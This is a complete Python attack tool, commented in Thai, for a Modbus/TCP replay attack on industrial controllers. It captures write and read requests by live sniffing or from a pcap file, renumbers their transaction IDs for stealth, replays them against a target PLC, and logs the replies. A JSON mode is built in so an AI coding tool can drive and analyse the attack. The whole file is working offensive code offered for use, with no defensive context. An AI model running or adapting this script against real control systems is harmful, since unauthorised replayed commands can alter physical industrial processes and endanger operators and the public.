#!/usr/bin/env python3
"""
===================================================================
🏴‍☠️ MODBUS SMART REPLAY ATTACK (GOD-MODE & AI-READY) 🏴‍☠️
===================================================================
# วิธีใช้ (Usage Examples):

# 1. โหมดดักจับสด (Sniff & Replay): ดักจับทราฟฟิกบน eth0 แล้วกด Ctrl+C เพื่อยิงซ้ำใส่เป้าหมาย
sudo python3 modbus_replay.py 192.168.1.100 --iface eth0

# 2. โหมด PCAP (Extract & Replay): ดึงเฉพาะ Request จากไฟล์ pcap แล้วยิงใส่เป้าหมาย
python3 modbus_replay.py 10.10.10.5 --pcap attack.pcap

# 3. รันผ่าน Trae IDE (พ่นผลลัพธ์เป็น JSON)
python3 modbus_replay.py 10.10.10.5 --pcap attack.pcap --json
===================================================================
"""
import argparse
import socket
import struct
import sys
import time
import json
import logging

# ปิดแจ้งเตือนกวนใจของ Scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sniff, TCP, IP, Raw, rdpcap

# --- ANSI Colors ---
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
C = '\033[96m'
W = '\033[0m'

captured_payloads = []

def capture_callback(target_port: int, is_json: bool):
    """ดักจับและสกัดเฉพาะ Payload ที่วิ่ง 'เข้าหา' เซิร์ฟเวอร์ (Request)"""
    def packet_handler(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            # ดักเฉพาะ Request (พุ่งเข้าหา port 502) ห้ามเอา Response มายิงซ้ำ!
            if pkt[TCP].dport == target_port:
                raw_data = bytes(pkt[Raw].load)
                
                # กรองให้แน่ใจว่าเป็น Modbus (ยาวขั้นต่ำ 8 bytes: MBAP 7 + PDU 1+)
                if len(raw_data) >= 8:
                    transaction_id = struct.unpack(">H", raw_data[0:2])[0]
                    function_code = raw_data[7]
                    
                    captured_payloads.append({
                        "original_tid": transaction_id,
                        "fc": function_code,
                        "payload": raw_data
                    })
                    
                    if not is_json:
                        sys.stdout.write("\033[K") # Clear line
                        print(f"{G}[+] Captured Request:{W} FC={function_code:02} | TID={transaction_id:05} | Len={len(raw_data)} bytes")
    return packet_handler

def extract_from_pcap(pcap_file: str, target_port: int, is_json: bool):
    """สกัดเฉพาะ Request จากไฟล์ PCAP"""
    if not is_json: print(f"{C}[*] Extracting payloads from {pcap_file}...{W}")
    try:
        packets = rdpcap(pcap_file)
        for pkt in packets:
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                if pkt[TCP].dport == target_port:
                    raw_data = bytes(pkt[Raw].load)
                    if len(raw_data) >= 8:
                        captured_payloads.append({
                            "original_tid": struct.unpack(">H", raw_data[0:2])[0],
                            "fc": raw_data[7],
                            "payload": raw_data
                        })
        if not is_json: print(f"{G}[+] Extracted {len(captured_payloads)} Modbus requests from PCAP.{W}")
    except Exception as e:
        if is_json: print(json.dumps({"error": f"Failed to read PCAP: {e}"}))
        else: print(f"{R}[-] Failed to read PCAP: {e}{W}")
        sys.exit(1)

def replay_packets(target_ip: str, target_port: int, timeout: float, is_json: bool):
    """ระบบยิง Replay ที่ใช้ TCP Socket จริงๆ เพื่อให้ผ่าน 3-Way Handshake"""
    ai_report = {
        "target": f"{target_ip}:{target_port}",
        "status": "success",
        "packets_replayed": 0,
        "responses": [],
        "error_msg": ""
    }

    if not captured_payloads:
        if is_json: print(json.dumps({"error": "No valid Modbus requests captured."}))
        else: print(f"{R}[-] No valid Modbus requests captured to replay!{W}")
        return

    if not is_json:
        print(f"\n{Y}[*] Establishing TCP Connection to {target_ip}:{target_port}...{W}")

    try:
        # 🚀 สร้าง Connection ให้ถูกต้อง
        with socket.create_connection((target_ip, target_port), timeout=timeout) as s:
            if not is_json: print(f"{G}[+] Connection Established! Starting Replay Attack...{W}\n")
            
            # ยิงทีละ Payload
            for idx, data in enumerate(captured_payloads):
                payload = bytearray(data["payload"])
                
                # 🧠 Smart Replay: เขียน Transaction ID ใหม่ให้เรียงกัน เพื่อความเนียน
                new_tid = idx + 1
                payload[0:2] = struct.pack(">H", new_tid)
                
                s.sendall(payload)
                ai_report["packets_replayed"] += 1
                
                if not is_json:
                    print(f"{C}[>] Replayed {idx+1}/{len(captured_payloads)}{W} (FC={data['fc']:02}, New TID={new_tid:05})")
                
                # รอรับ Response เพื่อให้ AI เอาไปวิเคราะห์ต่อ
                try:
                    s.settimeout(1.0) # รอคำตอบสั้นๆ
                    resp = s.recv(4096)
                    if resp:
                        ascii_safe = "".join(chr(b) if 32 <= b <= 126 else "." for b in resp)
                        ai_report["responses"].append({"tid": new_tid, "hex": resp.hex(), "ascii": ascii_safe})
                        if not is_json:
                            print(f"    {G}╰─> Reply: {resp.hex()}{W}")
                except socket.timeout:
                    if not is_json: print(f"    {Y}╰─> (No reply within 1s){W}")
                
                time.sleep(0.2) # หน่วงเวลาเล็กน้อยไม่ให้ PLC ค้าง
                
    except Exception as e:
        ai_report["status"] = "error"
        ai_report["error_msg"] = str(e)
        if not is_json: print(f"\n{R}[-] Replay aborted due to network error: {e}{W}")

    if is_json:
        print(json.dumps(ai_report, indent=2))
    else:
        print(f"\n{C}=================================================={W}")
        print(f"{G}[*] Replay Attack Completed!{W}")

def main():
    parser = argparse.ArgumentParser(description="Modbus Smart Replay Attack (God-Mode)")
    parser.add_argument("ip", help="Target IP address to replay against")
    parser.add_argument("--port", type=int, default=502, help="Target Port (default: 502)")
    parser.add_argument("--iface", help="Interface to sniff on (Live Mode)")
    parser.add_argument("--pcap", help="Read requests from PCAP file instead of sniffing")
    parser.add_argument("--timeout", type=float, default=3.0, help="Socket timeout")
    parser.add_argument("--json", action="store_true", help="Output pure JSON for Trae IDE")
    
    args = parser.parse_args()

    if not args.json:
        print(f"\n{C}=================================================={W}")
        print(f"{C} 🏴‍☠️ MODBUS SMART REPLAY ATTACK (GOD-MODE) 🏴‍☠️ {W}")
        print(f"{C}=================================================={W}")

    if args.pcap:
        # โหมด PCAP
        extract_from_pcap(args.pcap, args.port, args.json)
        replay_packets(args.ip, args.port, args.timeout, args.json)
    else:
        # โหมด Live Sniff
        if not args.json:
            print(f"[*] Mode: {Y}Live Sniff & Replay{W}")
            print(f"[*] Target Port Filter : TCP {args.port}")
            print(f"[*] Waiting to capture requests... {Y}(Press Ctrl+C to stop and start replaying){W}\n")
        
        handler = capture_callback(args.port, args.json)
        bpf_filter = f"tcp dst port {args.port}" # 🛡️ ดักเฉพาะ Request!
        
        try:
            if args.iface:
                sniff(filter=bpf_filter, prn=handler, iface=args.iface, store=0)
            else:
                sniff(filter=bpf_filter, prn=handler, store=0)
        except PermissionError:
            if args.json: print(json.dumps({"error": "Requires sudo/root for sniffing."}))
            else: print(f"{R}[-] Permission denied. Requires root/sudo privileges!{W}")
            sys.exit(1)
        except KeyboardInterrupt:
            if not args.json: print(f"\n\n{Y}[*] Capture stopped by user. Proceeding to Replay Phase...{W}")
            replay_packets(args.ip, args.port, args.timeout, args.json)
        except Exception as e:
            if args.json: print(json.dumps({"error": str(e)}))
            else: print(f"\n{R}[-] Sniffer error: {e}{W}")

if __name__ == "__main__":
    main()